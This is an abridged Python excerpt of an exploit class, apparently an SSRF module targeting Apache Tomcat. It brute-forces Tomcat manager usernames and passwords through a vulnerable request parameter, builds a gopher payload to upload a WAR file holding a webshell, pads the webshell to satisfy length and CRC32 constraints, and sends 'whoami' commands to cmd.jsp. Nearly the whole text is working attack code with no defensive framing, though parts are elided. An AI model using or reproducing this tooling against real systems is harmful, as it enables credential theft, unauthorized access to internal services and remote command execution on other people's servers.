...
class exploit:
        ...
        for ip in gen_host:
            for usr in self.tomcat_user:
                for pss in self.tomcat_pass:
                    payload = wrapper_http(
                        self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss
                    )
                    r = requester.do_request(args.param, payload)

                    if r != None and not "s3cret" in r.text:
                        logging.info(
                            "Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(
                                usr, pss
                            )
                        )
                        ...
                        for i in range(5):
                            ...
                            logging.info(
                                "Sending CMD to cmd.jsp for padding: {}".format(i)
                            )
                            payload = wrapper_http(
                                "cmd/cmd.jsp?cmd=whoami",
                                self.SERVER_HOST,
                                self.SERVER_PORT,
                            )
                            r = requester.do_request(args.param, payload)
    ...
    def send_war(self, padding):
        with open(self.EXPLOIT_JSP, "r") as f:
            ...
            webshell_data = self.validate_webshell_length_and_crc32(
                webshell_data + " " * padding
            )
    ...
    def validate_webshell_length_and_crc32(self, webshell_data):
        ...
        if self.args.verbose == True:
            logging.info(
                "Original file length: {}".format(
                    "{0:0{1}X}".format(len(webshell_data), 8)
                )
            )
            logging.info(
                "Original file crc32: {}".format(
                    format(binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF, "x")
                )
            )

        while valid_length == 0 or valid_crc32 == 0:
            crc_string = format(
                binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF, "x"
            )
            ...
            for x in lead_byte_locations:
                try:
                    if (
                        ws_len_byte_string[x] == "8"
                        or ws_len_byte_string[x] == "9"
                        or crc_string[x] == "8"
                        or crc_string[x] == "9"
                    ):
        ...
        if modded_length > 0:
            ...
            logging.info(
                "Length adjustment completed. "
                + str(modded_length)
                + " whitespace ' ' chars were added to the webshell input."
            )
            logging.info(
                "New file length: " + "{0:0{1}X}".format(len(webshell_data), 8)
            )
            logging.info(
                "New file crc32: "
                + format(binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF, "x")
    ...
    def build_gopher_payload(self):
        ...
        content_body = content.format(filename=self.EXPLOIT_WAR, warfile=warfile)
        payload = headers.format(
            host=self.SERVER_HOST,
            port=self.SERVER_PORT,
            credential=base64.b64encode(
                (self.SERVER_USER + ":" + self.SERVER_PASS).encode()
            ),
